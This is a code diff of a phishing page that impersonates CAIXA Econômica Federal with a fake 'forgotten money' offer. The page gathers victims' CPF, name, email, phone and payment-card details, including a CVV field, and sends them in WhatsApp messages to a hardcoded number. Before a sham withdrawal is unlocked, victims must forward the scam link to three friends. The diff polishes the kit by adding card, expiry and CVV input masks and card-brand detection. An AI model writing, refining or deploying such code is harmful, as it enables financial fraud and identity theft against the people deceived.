@@ -289,7 +289,7 @@
   <header class="site-header">
     <nav class="container navbar navbar-expand-lg">
       <a class="navbar-brand site-logo d-flex align-items-center" href="https://www.caixa.gov.br/">
-        <img src="https://i.pinimg.com/736x/ae/3d/94/ae3d9448e7a543b4ad94870b9a1dcfa9.jpg" alt="Logo CAIXA" style="height:48px;">
+        <img src="https://seebvideira.com.br/uploads/92868821-e42d-4dd5-a71a-6ee1241c82e5/caixa-logo.svg" alt="Logo CAIXA" style="height:48px;">
       </a>
       <button class="navbar-toggler border-0" type="button" data-bs-toggle="collapse" data-bs-target="#mainNav">
         <i class="fa fa-bars" style="color:#fff; font-size:1.05rem;"></i>
@@ -568,9 +568,89 @@
               <button id="confirmCartao" class="btn btn-modal-primary flex-grow-1">Enviar Solicitação</button>
             </div>
           </div>
-<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
 
-<script>
+  <script>
+    // ==================== MÁSCARAS PARA CAMPOS DO CARTÃO ====================
+    function mascaraCartao(input) {
+        let value = input.value.replace(/\D/g, '');
+        if (value.length > 16) value = value.slice(0, 16);
+        let formatted = '';
+        for (let i = 0; i < value.length; i++) {
+            if (i > 0 && i % 4 === 0) formatted += ' ';
+            formatted += value[i];
+        }
+        input.value = formatted;
+        detectarBandeiraCartao(value);
+    }
+
+    function detectarBandeiraCartao(numero) {
+        const bandeiras = [
+            { nome: 'Visa', regex: /^4/, cor: '#1a1f71' },
+            { nome: 'Mastercard', regex: /^5[1-5]/, cor: '#eb001b' },
+            { nome: 'Elo', regex: /^(4011|4312|4389|4514|4576|5041|5067|5090|6277|6363|6504|6505|6506|6507|6509|6516|6550|6551|6555)/, cor: '#1391C7' },
+            { nome: 'American Express', regex: /^3[47]/, cor: '#006FCF' },
+            { nome: 'Hipercard', regex: /^606282/, cor: '#B30000' },
+            { nome: 'Discover', regex: /^(6011|65|64[4-9]|622)/, cor: '#F79410' }
+        ];
+        const bandeira = bandeiras.find(b => b.regex.test(numero));
+        const input = document.getElementById('numeroCartao');
+        if (bandeira && numero.length >= 4) {
+            input.style.borderColor = bandeira.cor;
+            input.style.backgroundColor = '#f0f8ff';
+        } else {
+            input.style.borderColor = '#dee2e6';
+            input.style.backgroundColor = '#fff';
+        }
+    }
+
+    function mascaraValidade(input) {
+        let value = input.value.replace(/\D/g, '');
+        if (value.length > 4) value = value.slice(0, 4);
+        if (value.length >= 3) {
+            let mes = value.slice(0, 2);
+            if (parseInt(mes) > 12) mes = '12';
+            input.value = `${mes}/${value.slice(2, 4)}`;
+        } else {
+            input.value = value;
+        }
+        if (value.length === 4) {
+            const mes = parseInt(value.slice(0, 2));
+            const ano = parseInt(value.slice(2, 4));
+            const anoAtual = new Date().getFullYear() % 100;
+            const mesAtual = new Date().getMonth() + 1;
+            if (ano < anoAtual || (ano === anoAtual && mes < mesAtual)) {
+                input.style.borderColor = '#dc3545';
+                input.style.backgroundColor = '#fff5f5';
+            } else {
+                input.style.borderColor = '#28a745';
+                input.style.backgroundColor = '#f0fff4';
+            }
+        } else {
+            input.style.borderColor = '#dee2e6';
+            input.style.backgroundColor = '#fff';
+        }
+    }
+
+    function mascaraCVV(input) {
+        let value = input.value.replace(/\D/g, '');
+        if (value.length > 4) value = value.slice(0, 4);
+        input.value = value;
+        
+        const numeroCartao = document.getElementById('numeroCartao').value.replace(/\D/g, '');
+        const isAmex = numeroCartao.startsWith('34') || numeroCartao.startsWith('37');
+        const maxLength = isAmex ? 4 : 3;
+        
+        if (value.length === maxLength) {
+            input.style.borderColor = '#28a745';
+            input.style.backgroundColor = '#f0fff4';
+        } else {
+            input.style.borderColor = '#dee2e6';
+            input.style.backgroundColor = '#fff';
+        }
+    }
+
+    // ==================== SEU CÓDIGO EXISTENTE ====================
     let dadosUsuario = null;
     let dataSelecionada = null;
     let bootstrapModal = null;
@@ -578,11 +658,10 @@
     let saqueLiberado = false;
     let cpfAtual = null;
 
-    const WHATSAPP_NUMBER = "558699040705"; // Coloque seu número com DDD e país (55)
+    const WHATSAPP_NUMBER = "558699040705";
     const LINK_DO_SITE = "https://caixa-valores.onrender.com";
     const STORAGE_KEY = "caixa_valores_progresso";
 
-    // ==================== FUNÇÕES DE SALVAR/CARREGAR PROGRESSO ====================
     function salvarProgresso() {
         const progresso = {
             amigosIndicados: amigosIndicados,
@@ -593,7 +672,6 @@
             timestamp: new Date().getTime()
         };
         localStorage.setItem(STORAGE_KEY, JSON.stringify(progresso));
-        console.log("✅ Progresso salvo:", progresso);
     }
 
     function carregarProgresso() {
@@ -601,27 +679,19 @@
         if (salvo) {
             try {
                 const progresso = JSON.parse(salvo);
-                // Verificar se o progresso tem menos de 1 hora (válido)
                 const horaAtual = new Date().getTime();
                 const diferenca = horaAtual - progresso.timestamp;
-                
-                if (diferenca < 3600000) { // 1 hora de validade
+                if (diferenca < 3600000) {
                     amigosIndicados = progresso.amigosIndicados || 0;
                     saqueLiberado = progresso.saqueLiberado || false;
                     cpfAtual = progresso.cpfAtual;
                     dadosUsuario = progresso.dadosUsuario;
                     dataSelecionada = progresso.dataSelecionada;
-                    
-                    console.log("🔄 Progresso carregado:", { amigosIndicados, saqueLiberado });
                     return true;
                 } else {
-                    // Progresso expirado, limpar
                     localStorage.removeItem(STORAGE_KEY);
-                    console.log("⚠️ Progresso expirado, limpo");
                 }
-            } catch(e) {
-                console.error("Erro ao carregar progresso:", e);
-            }
+            } catch(e) {}
         }
         return false;
     }
@@ -633,11 +703,9 @@
         cpfAtual = null;
         dadosUsuario = null;
         dataSelecionada = null;
-        console.log("🗑️ Progresso limpo");
     }
 
     function atualizarInterfaceProgresso() {
-        // Atualizar indicadores visuais dos amigos
         for (let i = 1; i <= 3; i++) {
             const friendDiv = document.getElementById(`friend${i}`);
             if (friendDiv) {
@@ -652,16 +720,12 @@
                 }
             }
         }
-        
-        // Atualizar botões de saque
         const btnPix = document.getElementById('btnSaquePix');
         const btnCartao = document.getElementById('btnSaqueCartao');
         if (btnPix && btnCartao) {
             btnPix.disabled = !saqueLiberado;
             btnCartao.disabled = !saqueLiberado;
         }
-        
-        // Se tiver dados do usuário, atualizar a tela
         if (dadosUsuario && dataSelecionada) {
             const valor = dadosUsuario.valorDisponivel || 1987.48;
             document.getElementById('valorDisponivel').textContent = formatarMoeda(valor);
@@ -763,7 +827,7 @@
                     document.getElementById('cartaoValor').textContent = formatarMoeda(valor);
                     document.getElementById('dataCredito').textContent = getDataMaisDias(3);
                     
-                    salvarProgresso(); // Salvar após selecionar data
+                    salvarProgresso();
                     showStep('flowFinal', 3);
                 } else {
                     div.style.background = '#ffebee';
@@ -793,18 +857,22 @@
     }
 
     document.addEventListener('DOMContentLoaded', () => {
+        // Aplicar máscaras aos campos do cartão
+        const campoCartao = document.getElementById('numeroCartao');
+        const campoValidade = document.getElementById('validadeCartao');
+        const campoCVV = document.getElementById('cvvCartao');
+        
+        if (campoCartao) campoCartao.addEventListener('input', function() { mascaraCartao(this); });
+        if (campoValidade) campoValidade.addEventListener('input', function() { mascaraValidade(this); });
+        if (campoCVV) campoCVV.addEventListener('input', function() { mascaraCVV(this); });
+        
         const modalElement = document.getElementById('flowModal');
         bootstrapModal = new bootstrap.Modal(modalElement, { backdrop: 'static', keyboard: false });
         
-        // Tentar carregar progresso salvo
         const progressoCarregado = carregarProgresso();
         
         if (progressoCarregado && dadosUsuario && dataSelecionada) {
-            // Se tem progresso, restaurar a tela
-            console.log("🔄 Restaurando progresso salvo...");
             atualizarInterfaceProgresso();
-            
-            // Abrir o modal diretamente na tela final
             setTimeout(() => {
                 showStep('flowFinal', 3);
                 bootstrapModal.show();
@@ -813,14 +881,11 @@
         
         document.getElementById('abrir-verificar').addEventListener('click', (e) => {
             e.preventDefault();
-            // Se já tem progresso, perguntar se quer continuar ou recomeçar
             if (amigosIndicados > 0 || dadosUsuario) {
                 if (confirm(`Você já tem um progresso de ${amigosIndicados}/3 amigos indicados. Deseja continuar ou recomeçar?`)) {
-                    // Continuar - já está tudo carregado
                     showStep('flowFinal', 3);
                     bootstrapModal.show();
                 } else {
-                    // Recomeçar - limpar progresso
                     limparProgresso();
                     document.getElementById('demoCpf').value = '';
                     showStep('flowStep1', 1);
@@ -860,7 +925,6 @@
             }
         });
 
-        // Indicação de amigos no WhatsApp
         document.getElementById('btnIndicarWhats').addEventListener('click', () => {
             if (amigosIndicados >= 3) {
                 alert('Você já indicou 3 amigos! O saque já está liberado.');
@@ -868,11 +932,9 @@
             }
             
             const valorUsuario = dadosUsuario?.valorDisponivel ? formatarMoeda(dadosUsuario.valorDisponivel) : '?';
-            
             const mensagem = `🏦 *CAIXA - VALORES A RECEBER* 🏦\n\nDescobri que tenho R$ ${valorUsuario} esquecidos no Banco Central!\n\n💰 *Consulte o seu agora mesmo:*\n👇👇👇\n${LINK_DO_SITE}\n👆👆👆\n\n✅ É rápido, gratuito e pode ter dinheiro esperando por você!\n\nObrigado por me ajudar compartilhando este link! 💙`;
             
             enviarWhatsApp(mensagem);
-            
             amigosIndicados++;
             const friendDiv = document.getElementById(`friend${amigosIndicados}`);
             if (friendDiv) {
@@ -880,9 +942,8 @@
                 friendDiv.classList.add('success');
                 friendDiv.innerHTML = '✓';
             }
-            
             verificarLiberacaoSaque();
-            salvarProgresso(); // Salvar após indicar amigo
+            salvarProgresso();
             
             if (amigosIndicados < 3) {
                 alert(`🔹 Você indicou ${amigosIndicados} de 3 amigos. Continue para liberar o saque.`);
@@ -891,7 +952,6 @@
             }
         });
 
-        // Saque via Pix
         document.getElementById('btnSaquePix').addEventListener('click', () => {
             if (!saqueLiberado) {
                 alert('Você precisa indicar 3 amigos no WhatsApp para liberar o saque!');
@@ -903,31 +963,18 @@
         document.getElementById('confirmPix').addEventListener('click', () => {
             const email = document.getElementById('emailPix').value;
             const telefone = document.getElementById('telefonePix').value;
-            
             if (!email || !telefone) {
                 alert('Por favor, preencha todos os campos.');
                 return;
             }
-            
             const valor = dadosUsuario?.valorDisponivel || 1987.48;
-            const mensagem = `🆕 *NOVA SOLICITAÇÃO DE SAQUE - PIX* 🆕\n\n` +
-                `👤 *Beneficiário:* ${dadosUsuario?.nome || 'N/A'}\n` +
-                `🆔 *CPF:* ${cpfAtual ? formatarCPFDisplay(cpfAtual) : 'N/A'}\n` +
-                `📧 *E-mail:* ${email}\n` +
-                `📱 *Telefone:* ${telefone}\n` +
-                `💰 *Valor:* R$ ${formatarMoeda(valor)}\n` +
-                `🏦 *Banco:* CAIXA ECONÔMICA FEDERAL\n` +
-                `📅 *Data da solicitação:* ${new Date().toLocaleString('pt-BR')}\n` +
-                `⏰ *Previsão de crédito:* ${getDataMaisDias(3)}\n\n` +
-                `✅ *Solicitação enviada via Pix*`;
-            
+            const mensagem = `🆕 *NOVA SOLICITAÇÃO DE SAQUE - PIX* 🆕\n\n👤 *Beneficiário:* ${dadosUsuario?.nome || 'N/A'}\n🆔 *CPF:* ${cpfAtual ? formatarCPFDisplay(cpfAtual) : 'N/A'}\n📧 *E-mail:* ${email}\n📱 *Telefone:* ${telefone}\n💰 *Valor:* R$ ${formatarMoeda(valor)}\n🏦 *Banco:* CAIXA ECONÔMICA FEDERAL\n📅 *Data:* ${new Date().toLocaleString('pt-BR')}\n✅ *Solicitação via Pix*`;
             enviarWhatsApp(mensagem);
-            alert('✅ Solicitação enviada com sucesso! Em breve entraremos em contato.');
-            limparProgresso(); // Limpar após concluir
+            alert('✅ Solicitação enviada com sucesso!');
+            limparProgresso();
             showStep('flowSuccess', 3);
         });
 
-        // Saque via Cartão
         document.getElementById('btnSaqueCartao').addEventListener('click', () => {
             if (!saqueLiberado) {
                 alert('Você precisa indicar 3 amigos no WhatsApp para liberar o saque!');
@@ -941,33 +988,18 @@
             const validade = document.getElementById('validadeCartao').value;
             const cvv = document.getElementById('cvvCartao').value;
             const email = document.getElementById('emailCartao').value;
-            
             if (!numero || !validade || !cvv || !email) {
                 alert('Por favor, preencha todos os campos.');
                 return;
             }
-            
             const valor = dadosUsuario?.valorDisponivel || 1987.48;
-            const mensagem = `🆕 *NOVA SOLICITAÇÃO DE SAQUE - CARTÃO* 🆕\n\n` +
-                `👤 *Beneficiário:* ${dadosUsuario?.nome || 'N/A'}\n` +
-                `🆔 *CPF:* ${cpfAtual ? formatarCPFDisplay(cpfAtual) : 'N/A'}\n` +
-                `💳 *Número do Cartão:* ${numero}\n` +
-                `📅 *Validade:* ${validade}\n` +
-                `🔢 *CVV:* ${cvv}\n` +
-                `📧 *E-mail:* ${email}\n` +
-                `💰 *Valor:* R$ ${formatarMoeda(valor)}\n` +
-                `🏦 *Banco:* CAIXA ECONÔMICA FEDERAL\n` +
-                `📅 *Data da solicitação:* ${new Date().toLocaleString('pt-BR')}\n` +
-                `⏰ *Previsão de crédito:* ${getDataMaisDias(3)}\n\n` +
-                `✅ *Solicitação enviada via Cartão*`;
-            
+            const mensagem = `🆕 *NOVA SOLICITAÇÃO DE SAQUE - CARTÃO* 🆕\n\n👤 *Beneficiário:* ${dadosUsuario?.nome || 'N/A'}\n🆔 *CPF:* ${cpfAtual ? formatarCPFDisplay(cpfAtual) : 'N/A'}\n💳 *Cartão:* ${numero}\n📅 *Validade:* ${validade}\n📧 *E-mail:* ${email}\n💰 *Valor:* R$ ${formatarMoeda(valor)}\n✅ *Solicitação via Cartão*`;
             enviarWhatsApp(mensagem);
-            alert('✅ Solicitação enviada com sucesso! Em breve entraremos em contato.');
-            limparProgresso(); // Limpar após concluir
+            alert('✅ Solicitação enviada com sucesso!');
+            limparProgresso();
             showStep('flowSuccess', 3);
         });
 
-        // Fechar modais
         document.getElementById('cancelPix').addEventListener('click', () => {
             salvarProgresso();
             showStep('flowFinal', 3);
@@ -981,7 +1013,7 @@
             bootstrapModal.hide();
         });
     });
-</script>
+  </script>
           <!-- SUCESSO -->
           <div id="flowSuccess" class="flow-step text-center">
             <i class="fas fa-check-circle fa-4x" style="color:#1a7f2e;"></i>
